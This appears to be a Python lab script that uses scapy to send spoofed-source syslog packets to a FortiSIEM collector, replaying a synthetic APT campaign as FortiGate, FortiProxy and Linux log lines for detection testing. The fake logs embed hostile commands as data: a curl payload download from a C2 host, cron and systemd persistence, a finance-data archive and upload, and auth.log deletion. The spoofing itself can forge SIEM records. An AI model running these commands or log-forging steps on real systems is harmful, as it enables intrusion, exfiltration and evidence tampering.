#!/usr/bin/env python3

from scapy.all import IP, UDP, Raw, send
from datetime import datetime
import time
import random

# =========================
# CONFIGURACIÓN
# =========================

FORTISIEM_IP = "10.255.9.3"
FORTISIEM_PORT = 514

# IPs que FortiSIEM verá como Reporting IP si el spoofing UDP llega correctamente
FORTIGATE_IP = "10.0.20.101"
FORTIPROXY_IP = "10.0.20.102"
LINUX_WEB_IP = "10.0.20.103"
LINUX_DB_IP = "10.0.20.104"

# IPs de la historia APT
ATTACKER_IP = "185.231.88.45"
C2_IP = "45.83.120.10"
LINUX_TARGET = "10.0.10.20"
WINDOWS_TARGET = "10.0.10.30"
INTERNAL_COMPROMISED = "10.0.10.20"
VICTIM_USER = "j.garcia"

# Hostnames simulados
FGT_HOST = "FGT-LAB-EDGE"
FPX_HOST = "FPX-LAB-PROXY"
LINUX_WEB_HOST = "linux-web01"
LINUX_DB_HOST = "linux-db01"


# =========================
# FUNCIONES
# =========================

def now_fortinet():
    """
    FortiGate/FortiProxy suelen usar date=YYYY-MM-DD time=HH:MM:SS.
    """
    return datetime.now().strftime("%Y-%m-%d"), datetime.now().strftime("%H:%M:%S")


def now_syslog():
    """
    Syslog clásico: May 02 12:30:45.
    """
    return datetime.now().strftime("%b %d %H:%M:%S")


def send_spoofed_syslog(spoofed_ip, hostname, message, pri="<189>"):
    """
    Envía syslog UDP con IP origen spoofeada.
    FortiSIEM verá la IP spoofeada como Reporting IP si la red no bloquea anti-spoofing.
    """
    payload = f"{pri}{now_syslog()} {hostname} {message}"

    packet = (
        IP(src=spoofed_ip, dst=FORTISIEM_IP)
        / UDP(sport=random.randint(20000, 65000), dport=FORTISIEM_PORT)
        / Raw(load=payload)
    )

    send(packet, verbose=False)
    print(f"[+] {spoofed_ip} / {hostname} -> {message[:130]}")
    time.sleep(1)


def send_fortigate(message):
    send_spoofed_syslog(FORTIGATE_IP, FGT_HOST, message, pri="<189>")


def send_fortiproxy(message):
    send_spoofed_syslog(FORTIPROXY_IP, FPX_HOST, message, pri="<189>")


def send_linux_web(message):
    send_spoofed_syslog(LINUX_WEB_IP, LINUX_WEB_HOST, message, pri="<134>")


def send_linux_db(message):
    send_spoofed_syslog(LINUX_DB_IP, LINUX_DB_HOST, message, pri="<134>")


# =========================
# FORTIGATE-LIKE LOGS
# Formato FortiOS key=value
# =========================

def fortigate_traffic_log(
    logid,
    subtype,
    level,
    srcip,
    dstip,
    srcport,
    dstport,
    action,
    service,
    proto,
    msg,
    sentbyte=0,
    rcvdbyte=0
):
    date, tm = now_fortinet()
    return (
        f'date={date} time={tm} devname="{FGT_HOST}" devid="FGVM000000000001" '
        f'eventtime={int(time.time() * 1000000000)} tz="+0100" '
        f'logid="{logid}" type="traffic" subtype="{subtype}" level="{level}" vd="root" '
        f'srcip={srcip} srcport={srcport} srcintf="port1" srcintfrole="wan" '
        f'dstip={dstip} dstport={dstport} dstintf="port2" dstintfrole="lan" '
        f'srccountry="Reserved" dstcountry="Reserved" sessionid={random.randint(100000,999999)} '
        f'proto={proto} action="{action}" policyid=10 policytype="policy" '
        f'policyname="LAB-APT-Policy" service="{service}" trandisp="noop" '
        f'sentbyte={sentbyte} rcvdbyte={rcvdbyte} sentpkt=10 rcvdpkt=8 '
        f'appcat="unscanned" msg="{msg}"'
    )


def fortigate_utm_ips_log(srcip, dstip, attack, severity="critical"):
    date, tm = now_fortinet()
    return (
        f'date={date} time={tm} devname="{FGT_HOST}" devid="FGVM000000000001" '
        f'eventtime={int(time.time() * 1000000000)} tz="+0100" '
        f'logid="0419016384" type="utm" subtype="ips" eventtype="signature" '
        f'level="alert" vd="root" severity="{severity}" '
        f'srcip={srcip} srccountry="Reserved" dstip={dstip} dstcountry="Reserved" '
        f'srcintf="port1" dstintf="port2" policyid=10 sessionid={random.randint(100000,999999)} '
        f'action="detected" proto=6 service="SMB" srcport={random.randint(20000,65000)} dstport=445 '
        f'direction="incoming" attack="{attack}" attackid=15995 profile="default" '
        f'ref="http://www.fortinet.com/ids/VID15995" incidentserialno={random.randint(1000000,9999999)} '
        f'msg="{attack}"'
    )


def fortigate_dns_log(srcip, query, dstip):
    date, tm = now_fortinet()
    return (
        f'date={date} time={tm} devname="{FGT_HOST}" devid="FGVM000000000001" '
        f'eventtime={int(time.time() * 1000000000)} tz="+0100" '
        f'logid="1501054802" type="utm" subtype="dns" eventtype="dns-query" '
        f'level="notice" vd="root" srcip={srcip} srcport={random.randint(20000,65000)} '
        f'dstip={dstip} dstport=53 proto=17 action="pass" qname="{query}" '
        f'qtype="A" qtypeval=1 qclass="IN" msg="DNS query"'
    )


# =========================
# FORTIPROXY-LIKE LOGS
# Formato Fortinet key=value similar FortiProxy
# =========================

def fortiproxy_webfilter_log(srcip, user, url, hostname, action, msg, level="warning"):
    date, tm = now_fortinet()
    return (
        f'date={date} time={tm} devname="{FPX_HOST}" devid="FPXVM0000000001" '
        f'eventtime={int(time.time() * 1000000000)} tz="+0100" '
        f'logid="0317013312" type="utm" subtype="webfilter" eventtype="ftgd_blk" '
        f'level="{level}" vd="root" policyid=20 sessionid={random.randint(100000,999999)} '
        f'user="{user}" srcip={srcip} srcport={random.randint(20000,65000)} '
        f'dstip={C2_IP} dstport=80 proto=6 service="HTTP" hostname="{hostname}" '
        f'profile="default" action="{action}" reqtype="direct" url="{url}" '
        f'sentbyte=512 rcvdbyte=2048 direction="outgoing" msg="{msg}"'
    )


def fortiproxy_appctrl_log(srcip, user, app, action, msg):
    date, tm = now_fortinet()
    return (
        f'date={date} time={tm} devname="{FPX_HOST}" devid="FPXVM0000000001" '
        f'eventtime={int(time.time() * 1000000000)} tz="+0100" '
        f'logid="1059028704" type="utm" subtype="app-ctrl" eventtype="app-ctrl-all" '
        f'level="warning" vd="root" appid=16000 user="{user}" srcip={srcip} '
        f'dstip={C2_IP} srcport={random.randint(20000,65000)} dstport=443 proto=6 '
        f'service="HTTPS" app="{app}" appcat="Remote.Access" action="{action}" '
        f'policyid=20 sessionid={random.randint(100000,999999)} msg="{msg}"'
    )


# =========================
# LINUX-LIKE LOGS
# Syslog clásico: sshd/sudo/cron/systemd/audit
# =========================

def linux_sshd_failed(user, srcip, port):
    return f'sshd[{random.randint(1000,9999)}]: Failed password for invalid user {user} from {srcip} port {port} ssh2'


def linux_sshd_accepted(user, srcip, port):
    return f'sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {srcip} port {port} ssh2'


def linux_sudo(user, command):
    return f'sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}'


def linux_cron(user, command):
    return f'CRON[{random.randint(1000,9999)}]: ({user}) CMD ({command})'


def linux_systemd_service(service_name):
    return f'systemd[1]: Started {service_name}.'


def linux_audit_exec(user, exe, cmd):
    audit_id = random.randint(100000, 999999)
    return (
        f'audit: type=EXECVE msg=audit({int(time.time())}.{random.randint(100,999)}:{audit_id}): '
        f'argc=3 a0="{exe}" a1="-c" a2="{cmd}" auid=1001 uid=1001 gid=1001 '
        f'euid=1001 suid=1001 fsuid=1001 egid=1001 sgid=1001 fsgid=1001 '
        f'tty=pts0 ses=1 comm="{exe.split("/")[-1]}" exe="{exe}" key="exec" user="{user}"'
    )


def linux_auth_log_deleted(user):
    return f'sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/rm -f /var/log/auth.log'


# =========================
# CAMPAÑA APT
# =========================

def run_campaign():
    print("[+] Iniciando APT sintético parser-friendly para FortiSIEM 7.5")
    print("[+] Recuerda: valida en Event Search que eventType != Unknown_Event_Type")
    print()

    # Fase 1: Reconocimiento externo visto por FortiGate
    send_fortigate(
        fortigate_traffic_log(
            logid="0000000013",
            subtype="forward",
            level="notice",
            srcip=ATTACKER_IP,
            dstip=LINUX_TARGET,
            srcport=50101,
            dstport=22,
            action="deny",
            service="SSH",
            proto=6,
            msg="APT Sombra Norte - External SSH scan denied"
        )
    )

    send_fortigate(
        fortigate_traffic_log(
            logid="0000000013",
            subtype="forward",
            level="notice",
            srcip=ATTACKER_IP,
            dstip=WINDOWS_TARGET,
            srcport=50102,
            dstport=445,
            action="deny",
            service="SMB",
            proto=6,
            msg="APT Sombra Norte - External SMB probe denied"
        )
    )

    # Fase 2: IPS detecta patrón contra SMB
    send_fortigate(
        fortigate_utm_ips_log(
            srcip=ATTACKER_IP,
            dstip=WINDOWS_TARGET,
            attack="MS.SMB.Server.Trans2.Secondary.Handling.Code.Execution"
        )
    )

    # Fase 3: Fuerza bruta SSH en Linux
    for i in range(12):
        send_linux_web(linux_sshd_failed("admin", ATTACKER_IP, 51000 + i))

    # Fase 4: Login exitoso después de múltiples fallos
    send_linux_web(linux_sshd_accepted(VICTIM_USER, ATTACKER_IP, 51122))
    send_linux_web(linux_sudo(VICTIM_USER, "/bin/bash"))

    # Fase 5: Ejecución sospechosa Linux
    send_linux_web(
        linux_audit_exec(
            VICTIM_USER,
            "/bin/bash",
            f"curl http://{C2_IP}/payload.sh -o /tmp/.sysupdate"
        )
    )

    send_linux_web(
        linux_audit_exec(
            VICTIM_USER,
            "/bin/chmod",
            "chmod +x /tmp/.sysupdate"
        )
    )

    send_linux_web(
        linux_audit_exec(
            VICTIM_USER,
            "/tmp/.sysupdate",
            "/tmp/.sysupdate --silent"
        )
    )

    # Fase 6: Persistencia Linux por cron/systemd
    send_linux_web(linux_cron("root", "/tmp/.sysupdate --beacon"))
    send_linux_web("systemd[1]: Created symlink /etc/systemd/system/multi-user.target.wants/sysupdate.service → /etc/systemd/system/sysupdate.service.")
    send_linux_web(linux_systemd_service("sysupdate.service"))

    # Fase 7: Descubrimiento interno
    send_linux_web(linux_audit_exec(VICTIM_USER, "/usr/bin/whoami", "whoami"))
    send_linux_web(linux_audit_exec(VICTIM_USER, "/usr/sbin/ip", "ip addr"))
    send_linux_web(linux_audit_exec(VICTIM_USER, "/usr/bin/netstat", "netstat -antup"))
    send_linux_web(linux_audit_exec(VICTIM_USER, "/usr/bin/nmap", "nmap -sS 10.0.10.0/24"))

    # Fase 8: Movimiento lateral visto por FortiGate
    send_fortigate(
        fortigate_traffic_log(
            logid="0000000013",
            subtype="forward",
            level="notice",
            srcip=INTERNAL_COMPROMISED,
            dstip=WINDOWS_TARGET,
            srcport=53321,
            dstport=445,
            action="accept",
            service="SMB",
            proto=6,
            msg="APT Sombra Norte - Internal SMB lateral movement",
            sentbyte=20480,
            rcvdbyte=10240
        )
    )

    send_fortigate(
        fortigate_traffic_log(
            logid="0000000013",
            subtype="forward",
            level="notice",
            srcip=INTERNAL_COMPROMISED,
            dstip=WINDOWS_TARGET,
            srcport=53322,
            dstport=3389,
            action="accept",
            service="RDP",
            proto=6,
            msg="APT Sombra Norte - Internal RDP connection",
            sentbyte=10000,
            rcvdbyte=8000
        )
    )

    # Fase 9: Proxy ve payload / C2
    send_fortiproxy(
        fortiproxy_webfilter_log(
            srcip=LINUX_TARGET,
            user=VICTIM_USER,
            url=f"http://{C2_IP}/payload.sh",
            hostname="evil-example.com",
            action="passthrough",
            msg="APT Sombra Norte - Suspicious payload download"
        )
    )

    for i in range(8):
        send_fortiproxy(
            fortiproxy_webfilter_log(
                srcip=WINDOWS_TARGET,
                user=VICTIM_USER,
                url=f"http://{C2_IP}/checkin?id={i}",
                hostname="update-checkin-cdn.evil-example.com",
                action="passthrough",
                msg="APT Sombra Norte - Periodic C2 beacon"
            )
        )

    send_fortiproxy(
        fortiproxy_appctrl_log(
            srcip=WINDOWS_TARGET,
            user=VICTIM_USER,
            app="Unknown.TCP",
            action="detected",
            msg="APT Sombra Norte - Suspicious outbound application"
        )
    )

    # Fase 10: DNS sospechoso estilo FortiGate UTM DNS
    send_fortigate(
        fortigate_dns_log(
            srcip=WINDOWS_TARGET,
            query="update-checkin-cdn.evil-example.com",
            dstip="8.8.8.8"
        )
    )

    send_fortigate(
        fortigate_dns_log(
            srcip=WINDOWS_TARGET,
            query="d3f9a1b2c7.evil-example.com",
            dstip="8.8.8.8"
        )
    )

    # Fase 11: Exfiltración vista por proxy y firewall
    send_linux_db(
        linux_audit_exec(
            VICTIM_USER,
            "/bin/tar",
            "tar -czf /tmp/finance_backup.tar.gz /srv/finance"
        )
    )

    send_fortiproxy(
        fortiproxy_webfilter_log(
            srcip=WINDOWS_TARGET,
            user=VICTIM_USER,
            url=f"https://{C2_IP}/upload",
            hostname="evil-example.com",
            action="passthrough",
            msg="APT Sombra Norte - Large outbound upload",
            level="alert"
        )
    )

    send_fortigate(
        fortigate_traffic_log(
            logid="0000000013",
            subtype="forward",
            level="warning",
            srcip=WINDOWS_TARGET,
            dstip=C2_IP,
            srcport=54443,
            dstport=443,
            action="accept",
            service="HTTPS",
            proto=6,
            msg="APT Sombra Norte - Possible data exfiltration",
            sentbyte=52428800,
            rcvdbyte=1024
        )
    )

    # Fase 12: Borrado de huellas Linux
    send_linux_web(linux_audit_exec(VICTIM_USER, "/usr/bin/history", "history -c"))
    send_linux_web(linux_auth_log_deleted(VICTIM_USER))

    print()
    print("[+] Campaña finalizada.")


if __name__ == "__main__":
    run_campaign()
